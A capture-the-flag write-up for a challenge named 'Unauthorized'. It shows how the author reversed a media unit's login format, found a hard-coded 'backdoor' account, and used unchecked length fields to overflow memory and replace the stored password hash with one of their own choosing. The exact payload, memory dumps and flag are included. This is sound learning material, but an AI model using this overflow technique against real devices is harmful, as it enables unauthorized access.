# Unauthorized
Let's do something simple. This media unit has a Wifi access point and looks like remote access is possible. But only if you know the right password.

## Write-up
We have to login to get the flag, but we don't know the password to access...

1. We start to reverse and we determine the format of the data to send. It is LU:LP:UUUUUPPPPP
```
LU=Length of user
LP=Length of password
UUUUU=User
PPPPP=Password

Example
7:11:theuserthepassword
```

2. We find in the code a created user. The username is "backdoor" but the password is unknown. It is stored as SHA256 hash with this value 55030C349FC95E1385935EA23366B5A99945D8BF35D372C3AA722BB97492CA26

3. While I continued reversing I launch a brute-force for this hash... The brute-force hadn't success

4. The firmware doesn't check the length of the inputs and it reserves space according to the length parameters received. Modifying the length parameters we can select where username and password will be stored -> We can overwrite the stored password hash!!

5. We generate a sha256 hash of a known string. For example "1111" -> 0F FE 1A BD 1A 08 21 53 53 C2 33 D6 E0 09 61 3E 95 EE C4 25 38 32 A7 61 AF 28 FF 37 AC 5A 15 0C

6. We send a login with a calculated password length to overwrite the stored password hash with our custom value 
```
BEFORE:
003000 | 00 55 03 0C 34 9F C9 5E 13 85 93 5E A2 33 66 B5 
003010 | A9 99 45 D8 BF 35 D3 72 C3 AA 72 2B B9 74 92 CA 
003020 | 26 25 30 09 00 62 61 63 6B 64 6F 6F 72 00 00 00 

SEND:
8:3768:backdoor#00#0F#FE#1A#BD#1A#08#21#53#53#C2#33#D6#E0#09#61#3E#95#EE#C4#25#38#32#A7#61#AF#28#FF#37#AC#5A#15#0C#25#30#09#00#62#61#63#6B#64#6F#6F#72#00

AFTER
003000 | 00 0F FE 1A BD 1A 08 21 53 53 C2 33 D6 E0 09 61 
003010 | 3E 95 EE C4 25 38 32 A7 61 AF 28 FF 37 AC 5A 15 
003020 | 0C 25 30 09 00 62 61 63 6B 64 6F 6F 72 00 00 00 
```

7. We login now with our known password (8:4:backdoor1111) and we get the flag
	
```
Initializing...
Initialized      

8:3768:backdoorþ½!SSÂ3Öàa>•îÄ%82§a¯(ÿ7¬Z%0backdoor
Wrong password!

8:4:backdoor1111
Your flag is:
dd6d3e45e699c2bddd96413f32144fa4
```